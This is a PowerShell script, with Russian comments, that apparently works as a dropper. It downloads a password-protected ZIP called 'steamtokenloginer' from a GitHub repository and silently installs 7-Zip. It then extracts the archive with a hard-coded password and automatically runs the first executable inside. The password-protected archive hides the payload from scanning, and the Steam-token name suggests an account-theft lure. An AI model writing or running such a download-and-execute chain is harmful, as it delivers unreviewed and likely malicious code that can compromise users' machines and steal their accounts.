$zipUrl="https://github.com/gseff137-afk/test/raw/refs/heads/main/steamtokenloginer_1.zip"
$targetFolder="C:\Users\zenas\Desktop\Новая папка (7)"
$zipPath="$targetFolder\steamtokenloginer.zip"
$extractPath="$targetFolder\steamtokenloginer"
$password="5555"

if(-not(Test-Path $targetFolder)){New-Item -ItemType Directory -Path $targetFolder -Force}

Write-Host "Downloading ZIP..." -ForegroundColor Yellow
try{
    Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
    $fileSize=(Get-Item $zipPath).Length
    Write-Host "ZIP size: $([math]::Round($fileSize/1MB,2)) MB" -ForegroundColor Cyan
    
    if($fileSize -gt 0){
        # Создаем папку для распаковки
        if(Test-Path $extractPath){Remove-Item $extractPath -Recurse -Force}
        New-Item -ItemType Directory -Path $extractPath -Force
        
        # Скачиваем 7-Zip portable
        Write-Host "Downloading 7-Zip Portable..." -ForegroundColor Yellow
        $7zUrl="https://www.7-zip.org/a/7z2301-x64.exe"
        $7zInstaller="$env:TEMP\7z.exe"
        Invoke-WebRequest -Uri $7zUrl -OutFile $7zInstaller
        
        # Распаковываем 7-Zip
        $7zFolder="$env:TEMP\7z"
        if(Test-Path $7zFolder){Remove-Item $7zFolder -Recurse -Force}
        New-Item -ItemType Directory -Path $7zFolder -Force
        
        # Извлекаем 7z.exe из установщика
        Start-Process -FilePath $7zInstaller -ArgumentList "/S","/D=$7zFolder" -Wait
        
        # Ищем 7z.exe
        $7zExe=Get-ChildItem -Path $7zFolder -Recurse -Filter "7z.exe" | Select-Object -First 1
        
        if($7zExe){
            Write-Host "Extracting with 7-Zip..." -ForegroundColor Green
            & $7zExe.FullName x "-p$password" "-o$extractPath" "-y" $zipPath
            
            # Проверяем результат
            $extractedFiles=@(Get-ChildItem $extractPath -ErrorAction SilentlyContinue)
            if($extractedFiles.Count -gt 0){
                Write-Host "SUCCESS! Files extracted: $($extractedFiles.Count)" -ForegroundColor Green
                $exeFile=$extractedFiles | Where-Object{$_.Extension -eq '.exe'} | Select-Object -First 1
                if($exeFile){
                    Write-Host "Starting: $($exeFile.Name)" -ForegroundColor Green
                    Start-Process -FilePath "$extractPath\$($exeFile.Name)"
                }
            }else{
                Write-Host "Extraction failed with 7-Zip" -ForegroundColor Red
                Invoke-Item $targetFolder
            }
        }else{
            Write-Host "7-Zip not found, opening folder for manual extraction" -ForegroundColor Yellow
            Write-Host "Password: $password" -ForegroundColor Cyan
            Invoke-Item $targetFolder
        }
    }
}catch{
    Write-Host "Error: $_" -ForegroundColor Red
    Invoke-Item $targetFolder
}
